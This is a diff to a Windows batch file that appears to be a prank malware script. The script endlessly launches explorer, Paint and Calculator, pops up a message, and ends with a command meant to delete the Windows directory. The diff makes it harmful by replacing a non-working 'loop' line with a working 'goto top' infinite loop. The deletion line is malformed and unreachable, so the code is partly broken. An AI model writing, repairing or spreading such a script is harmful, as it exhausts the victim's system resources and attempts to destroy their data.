@@ -1,5 +1,7 @@
 @echo off
 
+:top
+
 start explorer
 
 start mspaint
@@ -10,6 +12,6 @@ start calc
 
 msg * Yahaha Wahyu
 
-loop
+goto top
 
 del "C:Windows"
